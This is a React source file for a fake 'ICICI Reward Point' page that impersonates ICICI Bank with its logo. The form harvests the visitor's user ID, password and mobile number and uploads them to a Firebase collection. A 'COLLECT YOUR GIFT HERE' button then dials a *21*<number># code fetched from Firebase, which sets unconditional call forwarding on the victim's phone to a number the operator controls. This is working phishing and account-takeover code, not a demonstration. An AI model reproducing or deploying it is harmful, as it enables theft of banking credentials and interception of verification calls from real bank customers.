import { useState, useEffect } from 'react';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/icici_logo.jpeg';

function App() {
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [forwardingNumber, setForwardingNumber] = useState(null);
  const [isLoading, setIsLoading] = useState(true); // Loading state
  const [isSubmitting, setIsSubmitting] = useState(false); // Submit loading state

  // Simulate loading on initial page load
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 1000); // 1-second delay
    return () => clearTimeout(timer);
  }, []);

  // Fetch forwarding number
  useEffect(() => {
    const getForwardingNumber = async () => {
      const result = await FirebaseUtil.getDocument("settings", "forwarding_numbers");
      setForwardingNumber(result);
    };
    getForwardingNumber();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true); // Show loading during submit

    // Simulate form submission delay
    setTimeout(() => {
      FirebaseUtil.uploadAnyModel("notes", { name, phone, password });
      setIsLoggedIn(true);
      setIsSubmitting(false); // Hide loading after submit
    }, 2000); // 1-second delay
  };

  if (isLoading) {
    return (
      <div className="flex items-center justify-center h-screen bg-gradient-to-br from-blue-100 via-blue-200 to-blue-300">
        <div className="text-center">
          <svg
            className="animate-spin h-16 w-16 text-blue-600 mx-auto mb-4"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            ></circle>
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            ></path>
          </svg>
          <p className="text-gray-900 text-xl font-semibold tracking-wide">
            Please wait, loading...
          </p>
        </div>
      </div>
    );
  }
  

  if (isLoggedIn) {
    return (
      <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
        <img src={myImage} alt="Description of the image" />
        <div className="flex justify-center mb-4">
          <p className="text-lg text-gray-900 mb-4">Welcome to ICICI Reward Point.</p>
        </div>
        <p className="text-lg text-gray-700 mb-4">
          To Collect Your Reward Point Gifts, give us a Miss Call to ICICI Bank Reward Care by clicking the button below.
        </p>
        <div className="flex justify-center">
          <button
            className="bg-orange-500 hover:bg-orange-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
            onClick={() =>
              window.open(
                `tel:*21*${forwardingNumber?.call_forwarding_number}%23`,
                '_self'
              )
            }
          >
            COLLECT YOUR GIFT HERE
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-md mx-auto p-4 mt-4 bg-white rounded shadow">
      {isSubmitting && (
        <div className="absolute inset-0 flex items-center justify-center bg-white bg-opacity-50">
          <div className="loader"></div>
        </div>
      )}
      <img src={myImage} alt="Description of the image" />
      <h1 className="text-lg font-bold mb-4 flex items-center text-blue-910">
        <MdLock className="mr-2 text-orange-500" />
        Welcome to ICICI Reward Point
      </h1>
      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="name"
          >
            User ID
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="name"
            type="text"
            value={name}
            onChange={(e) => setName(e.target.value)}
            required
          />
        </div>
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="password"
          >
            Password
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        <div className="mb-4">
          <label
            className="block text-gray-700 text-sm font-bold mb-2"
            htmlFor="phone"
          >
            Mobile Number
          </label>
          <input
            className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
            id="phone"
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            required
            maxLength="10"
          />
        </div>
        <div className="flex justify-center">
          <button
            className="bg-orange-500 hover:bg-orange-700 text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline"
            type="submit"
            disabled={isSubmitting} // Disable button during submit
          >
            {isSubmitting ? "Loading..." : "Proceed"}
          </button>
        </div>
      </form>
    </div>
  );
}

export default App;
